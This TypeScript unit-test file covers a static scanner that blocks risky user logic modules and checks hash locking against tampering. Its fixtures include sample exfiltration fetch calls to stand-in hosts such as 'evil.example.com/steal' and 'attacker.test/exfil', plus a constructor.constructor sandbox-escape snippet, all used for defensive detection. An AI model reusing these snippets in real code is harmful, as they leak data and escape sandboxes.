import {
  scanLogicModule,
  computeModuleHash,
  verifyHash,
  toModerationError,
  MODULE_HASH_PREFIX,
  DEFAULT_RESOURCE_BOMB_THRESHOLD,
  type ScanResult,
  type ScanViolationCategory,
} from './static-code-scan';
import { WorldApiCapability } from '../../../../shared/types/world-creation';

/**
 * Unit tests for Static_Code_Scan (Task 21.2, R10.2).
 *
 * Coverage:
 *  - Each of the four high-risk categories (①capability_abuse ②dynamic_eval
 *    ③resource_bomb ④egress_violation) is detected, returns a structured
 *    violation (category + reason + line/column), and blocks publish
 *    (`passed === false`).
 *  - A clean Tier_C module passes the scan.
 *  - hash locking: a reviewed module's hash is locked via computeModuleHash and
 *    re-verified at publish/runtime; a post-publish bytecode swap (hash
 *    mismatch) is rejected.
 *
 * All scan functions are pure, so these drive them directly — no DB, no mocks.
 */
describe('static-code-scan (Tier_C R10.2)', () => {
  /** Helper: assert exactly one violation category is present in a result. */
  const categoriesOf = (result: ScanResult): ScanViolationCategory[] =>
    result.violations.map((v) => v.category);

  // ============================================================
  // ① capability_abuse
  // ============================================================
  describe('① capability_abuse', () => {
    it('flags use of an undeclared World_API capability and blocks publish', () => {
      // Module declares only ui.* but calls economy.requestCharge.
      const source = `
        function onTick(api) {
          api.call('${WorldApiCapability.EconomyRequestCharge}', { amount: 10 });
        }
      `;
      const result = scanLogicModule(source, [WorldApiCapability.Ui]);

      expect(result.passed).toBe(false);
      expect(categoriesOf(result)).toContain('capability_abuse');
      const v = result.violations.find((x) => x.category === 'capability_abuse')!;
      expect(v.reason).toContain('economy.requestCharge');
      expect(v.line).toBeGreaterThan(0);
      expect(v.column).toBeGreaterThan(0);
    });

    it('passes when the used capability is declared (wildcard-aware)', () => {
      // ui.* grants ui.toast.
      const source = `api.call('ui.toast', { text: 'hi' });`;
      const result = scanLogicModule(source, [WorldApiCapability.Ui]);
      expect(result.passed).toBe(true);
      expect(result.violations).toHaveLength(0);
    });

    it('treats a concrete declared capability as granted', () => {
      const source = `api.call('${WorldApiCapability.SceneSpawn}', {});`;
      const result = scanLogicModule(source, [WorldApiCapability.SceneSpawn]);
      expect(result.passed).toBe(true);
    });
  });

  // ============================================================
  // ② dynamic_eval / obfuscation
  // ============================================================
  describe('② dynamic_eval', () => {
    it('flags a direct eval() call and blocks publish', () => {
      const source = `function run(input) { return eval(input); }`;
      const result = scanLogicModule(source, []);

      expect(result.passed).toBe(false);
      expect(categoriesOf(result)).toContain('dynamic_eval');
      expect(
        result.violations.find((v) => v.category === 'dynamic_eval')!.reason,
      ).toMatch(/eval/i);
    });

    it('flags the Function constructor (new Function(...))', () => {
      const source = `const f = new Function('a', 'b', 'return a + b');`;
      const result = scanLogicModule(source, []);
      expect(result.passed).toBe(false);
      expect(categoriesOf(result)).toContain('dynamic_eval');
    });

    it('flags constructor.constructor sandbox-escape trick', () => {
      const source = `const g = ({}).constructor.constructor('return this')();`;
      const result = scanLogicModule(source, []);
      expect(result.passed).toBe(false);
      expect(categoriesOf(result)).toContain('dynamic_eval');
    });
  });

  // ============================================================
  // ③ resource_bomb
  // ============================================================
  describe('③ resource_bomb', () => {
    it('flags an infinite while(true) loop and blocks publish', () => {
      const source = `function spin() { while (true) { doWork(); } }`;
      const result = scanLogicModule(source, []);

      expect(result.passed).toBe(false);
      expect(categoriesOf(result)).toContain('resource_bomb');
      expect(
        result.violations.find((v) => v.category === 'resource_bomb')!.reason,
      ).toMatch(/infinite/i);
    });

    it('flags an oversized Array allocation at/above the threshold', () => {
      const source = `const huge = new Array(1e9);`;
      const result = scanLogicModule(source, []);
      expect(result.passed).toBe(false);
      expect(categoriesOf(result)).toContain('resource_bomb');
    });

    it('flags an oversized loop bound', () => {
      const source = `for (let i = 0; i < 1e12; i++) { tick(); }`;
      const result = scanLogicModule(source, []);
      expect(result.passed).toBe(false);
      expect(categoriesOf(result)).toContain('resource_bomb');
    });

    it('does NOT flag a modest allocation below the threshold', () => {
      const source = `const small = new Array(1024);`;
      const result = scanLogicModule(source, []);
      expect(result.passed).toBe(true);
    });

    it('respects a custom resourceBombThreshold', () => {
      const source = `const a = new Array(2000);`;
      const result = scanLogicModule(source, [], { resourceBombThreshold: 1000 });
      expect(result.passed).toBe(false);
      expect(categoriesOf(result)).toContain('resource_bomb');
    });
  });

  // ============================================================
  // ④ egress_violation
  // ============================================================
  describe('④ egress_violation', () => {
    it('flags a non-https egress target and blocks publish', () => {
      const source = `fetch('http://evil.example.com/steal');`;
      const result = scanLogicModule(source, [], {
        egressAllowedHosts: ['evil.example.com'],
      });

      expect(result.passed).toBe(false);
      expect(categoriesOf(result)).toContain('egress_violation');
      expect(
        result.violations.find((v) => v.category === 'egress_violation')!.reason,
      ).toMatch(/https/i);
    });

    it('flags an https target whose host is outside the allowlist', () => {
      const source = `fetch('https://attacker.test/exfil');`;
      const result = scanLogicModule(source, [], {
        egressAllowedHosts: ['api.example.com'],
      });
      expect(result.passed).toBe(false);
      expect(categoriesOf(result)).toContain('egress_violation');
      expect(
        result.violations.find((v) => v.category === 'egress_violation')!.reason,
      ).toContain('attacker.test');
    });

    it('passes when the https host matches an exact allowlist entry', () => {
      const source = `fetch('https://api.example.com/v1/score');`;
      const result = scanLogicModule(source, [], {
        egressAllowedHosts: ['api.example.com'],
      });
      expect(result.passed).toBe(true);
    });

    it('passes when the https host matches a *.wildcard allowlist entry', () => {
      const source = `fetch('https://cdn.example.com/asset.png');`;
      const result = scanLogicModule(source, [], {
        egressAllowedHosts: ['*.example.com'],
      });
      expect(result.passed).toBe(true);
    });
  });

  // ============================================================
  // Clean module + multi-violation aggregation
  // ============================================================
  describe('clean module', () => {
    it('passes a clean Tier_C module that only uses declared capabilities', () => {
      const source = `
        // A well-behaved Tier_C logic module.
        function onTick(api, state) {
          const score = state.get('score') || 0;
          api.call('${WorldApiCapability.StateKv}', { op: 'set', key: 'score', value: score + 1 });
          api.call('ui.toast', { text: 'tick' });
        }
      `;
      const result = scanLogicModule(
        source,
        [WorldApiCapability.StateKv, WorldApiCapability.Ui],
        { egressAllowedHosts: ['api.example.com'] },
      );
      expect(result.passed).toBe(true);
      expect(result.violations).toHaveLength(0);
    });

    it('does not fire on capability tokens / URLs that appear only in comments', () => {
      const source = `
        // do NOT call eval() here, and avoid http://bad.test
        function ok() { return 1 + 1; }
      `;
      const result = scanLogicModule(source, []);
      expect(result.passed).toBe(true);
    });

    it('returns all violations (in source order) when several categories are present', () => {
      const source = [
        `api.call('${WorldApiCapability.NetFetch}', {});`, // ① undeclared cap
        `eval('1');`, // ② dynamic eval
        `while (true) {}`, // ③ resource bomb
        `fetch('http://bad.test/x');`, // ④ non-https egress
      ].join('\n');
      const result = scanLogicModule(source, []);

      expect(result.passed).toBe(false);
      const cats = categoriesOf(result);
      expect(cats).toEqual(expect.arrayContaining([
        'capability_abuse',
        'dynamic_eval',
        'resource_bomb',
        'egress_violation',
      ]));
      // Source-ordered: monotonically non-decreasing line numbers.
      for (let i = 1; i < result.violations.length; i++) {
        expect(result.violations[i].line).toBeGreaterThanOrEqual(
          result.violations[i - 1].line,
        );
      }
    });

    it('passes an empty source', () => {
      expect(scanLogicModule('', []).passed).toBe(true);
    });
  });

  // ============================================================
  // hash locking (design §3.3)
  // ============================================================
  describe('hash locking', () => {
    const reviewedSource = `function onTick(api){ api.call('ui.toast',{text:'ok'}); }`;

    it('computes a sha256:<hex> locking hash and is stable for the same source', () => {
      const hash = computeModuleHash(reviewedSource);
      expect(hash.startsWith(MODULE_HASH_PREFIX)).toBe(true);
      expect(hash).toMatch(/^sha256:[0-9a-f]{64}$/);
      expect(computeModuleHash(reviewedSource)).toBe(hash);
    });

    it('verifies unchanged reviewed bytecode against its locked hash', () => {
      const locked = computeModuleHash(reviewedSource);
      expect(verifyHash(reviewedSource, locked)).toBe(true);
    });

    it('rejects a post-publish bytecode swap (hash mismatch)', () => {
      const locked = computeModuleHash(reviewedSource);
      const tampered = reviewedSource.replace("ui.toast", "eval('x')");
      expect(verifyHash(tampered, locked)).toBe(false);
    });

    it('accepts a locked hash supplied without the sha256: prefix', () => {
      const locked = computeModuleHash(reviewedSource);
      const bare = locked.slice(MODULE_HASH_PREFIX.length);
      expect(verifyHash(reviewedSource, bare)).toBe(true);
    });

    it('rejects an empty / malformed locked hash', () => {
      expect(verifyHash(reviewedSource, '')).toBe(false);
      // @ts-expect-error — defensive: non-string input must not throw.
      expect(verifyHash(reviewedSource, null)).toBe(false);
    });
  });

  // ============================================================
  // toModerationError — structured rejection (R10.3)
  // ============================================================
  describe('toModerationError', () => {
    it('builds a MODERATION_REJECTED error carrying stage + category + reason + location', () => {
      const result = scanLogicModule(`eval('x');`, []);
      expect(result.passed).toBe(false);

      const err = toModerationError('mod-1', result);
      expect(err.error).toBe('MODERATION_REJECTED');
      expect(err.detail).toContain('static_code_scan');
      expect(err.detail).toContain('mod-1');
      expect(err.detail).toContain('dynamic_eval');
      expect(err.detail).toMatch(/line \d+:\d+/);
    });
  });

  // ============================================================
  // sanity: exported default threshold
  // ============================================================
  it('exposes a sane default resource-bomb threshold', () => {
    expect(DEFAULT_RESOURCE_BOMB_THRESHOLD).toBe(1_000_000);
  });
});
